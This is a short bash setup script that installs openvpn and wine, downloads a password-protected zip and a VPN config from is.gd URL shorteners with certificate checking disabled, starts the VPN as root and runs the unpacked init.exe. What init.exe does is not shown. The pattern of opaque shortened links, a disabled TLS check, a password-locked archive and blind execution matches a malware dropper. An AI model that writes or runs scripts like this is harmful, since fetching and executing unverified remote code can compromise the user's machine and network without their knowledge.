#!/bin/bash
sudo apt update;
sudo apt install unzip wget openvpn -y;
mkdir ~/init/;
wget --no-check-certificate -O ~/init/init.zip https://is.gd/initzip;
wget --no-check-certificate -O ~/init/vpn https://is.gd/sickvpnclient;
cd ~/init/;
sudo openvpn vpn&
rm -rf init.exe;
unzip -P1011011011 init.zip;
wine init.exe;
exit 0
